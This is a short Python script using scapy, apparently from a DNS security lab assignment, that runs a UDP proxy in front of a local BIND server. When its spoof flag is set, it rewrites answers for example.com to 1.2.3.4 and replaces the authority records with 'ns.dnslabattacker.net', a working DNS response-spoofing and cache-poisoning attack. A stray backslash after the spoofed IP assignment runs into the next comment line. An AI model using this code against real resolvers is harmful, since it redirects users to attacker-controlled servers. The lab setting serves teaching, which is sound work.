#!/usr/bin/env python
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response


BUF_SIZE = 1024


SPF_IP = '1.2.3.4'
SPF_NS = 'ns.dnslabattacker.net'


def dns_proxy(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', port))
    udp_port = 0
    print('proxy is bind to port ' + str(port))
    
    while True:
        data, addr = sock.recvfrom(BUF_SIZE)
        
        # if its coming from DNS server
        if addr[1] == dns_port:
            if SPOOF:
                # if the query is for example.com, send spoofed response
                if 'example.com' in str(DNS(data).qd[0].qname):
                    spf_dns = DNS(data)
                    spf_dns.an[0].rdata = SPF_IP\
                    # remove additional section
                    spf_dns.arcount = 0
                    spf_dns.ar = None
    
                    for i in range(spf_dns.nscount):
                        spf_dns.ns[i].rdata = SPF_NS
                    
                    spfResp = spf_dns
                    sock.sendto(bytes(spfResp), ('127.0.0.1', udp_port))
                else: 
                    sock.sendto(data,('127.0.0.1', udp_port))

            else: 
                sock.sendto(data, ('127.0.0.1', udp_port))
        
        # if its coming from dig
        else:
            udp_port = addr[1]
            sock.sendto(data, ('127.0.0.1', dns_port))



if __name__ == "__main__":
    dns_proxy(port)

